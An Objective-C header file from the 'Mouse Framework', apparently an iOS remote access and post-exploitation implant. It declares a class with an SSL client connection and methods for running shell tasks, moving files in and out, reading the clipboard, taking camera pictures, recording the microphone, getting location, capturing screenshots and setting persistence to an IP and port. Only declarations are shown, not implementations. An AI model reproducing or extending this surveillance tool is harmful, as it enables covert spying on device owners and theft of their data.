//            ---------------------------------------------------
//                              Mouse Framework                                 
//            ---------------------------------------------------
//                Copyright (C) <2019-2020>  <Entynetproject>
//
//        This program is free software: you can redistribute it and/or modify
//        it under the terms of the GNU General Public License as published by
//        the Free Software Foundation, either version 3 of the License, or
//        any later version.
//
//        This program is distributed in the hope that it will be useful,
//        but WITHOUT ANY WARRANTY; without even the implied warranty of
//        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
//        GNU General Public License for more details.
//
//        You should have received a copy of the GNU General Public License
//        along with this program.  If not, see <http://www.gnu.org/licenses/>.

#import <Foundation/Foundation.h>
#import <AppSupport/CPDistributedMessagingCenter.h>
#import <AVFoundation/AVFoundation.h>
#import <AudioToolbox/AudioToolbox.h>
#import <CoreFoundation/CFUserNotification.h>
#import <CoreLocation/CoreLocation.h>
#import <MediaPlayer/MediaPlayer.h>
#include "SpringBoardServices/SpringBoardServices.h"
#include <openssl/bio.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "NSTask.h"
#include "bootstrap.h"
#include <util.h>
#include <sys/ttycom.h>
#include <unistd.h>
#include <dirent.h>

@interface mouse : NSObject <AVAudioRecorderDelegate> {
    @public
    SSL* client_ssl;
    char *terminator;
}

CFArrayRef SBSCopyApplicationDisplayIdentifiers(bool onlyActive, bool debuggable);
extern int SBSLaunchApplicationWithIdentifier(CFStringRef identifier, Boolean suspended);


@property (retain) NSFileManager *fileManager;
@property (retain) CPDistributedMessagingCenter *messagingCenter;
@property (readwrite, retain) AVCaptureStillImageOutput *stillImageOutput;
@property (nonatomic,strong) AVCaptureSession *session;
@property (nonatomic,retain) AVAudioRecorder *audioRecorder;
@property (retain) UIDevice *thisUIDevice;
@property (retain) NSTask *systask;

-(void)rocketMC:(NSString *)command;
-(void)rocketMCWithReply:(NSString *)command;

-(void)showAlert:(NSString *)args;
-(void)changeDirectory:(NSString *)dir;
-(void)getPasteBoard;
-(void)runTask:(NSString *)cmd :(bool)sendTerm;
-(void)sendFile:(NSString *)path;
-(void)receiveFile:(NSString *)args;
-(void)openURL:(NSString *)arg;
-(void)openApp:(NSString *)arg;
-(NSData *)receiveData:(long)size;
-(void)takePicture:(bool)front;
-(void)tabComplete:(NSString *)path;
-(void)listDirectory:(NSString *)path;
-(NSDictionary *)getDirectoryContents:(NSString *)path;
-(void)persistence:(NSString *)args :(NSString *)ip :(int)port;
-(void)getProcessId;
-(void)getBattery;
-(void)getVolume;
-(void)vibrate;
-(void)screenshot;
-(void)bundleIds;
-(void)locate;
-(void)getPid;
-(void)sysinfo;
-(void)ipod:(NSString *)args;
-(void)say:(NSString *)string;
-(void)setVolume:(NSString *)args;
-(void)mic:(NSString *)arg;
-(void)debugLog:(NSString *)string;
-(void)killTask;
@end
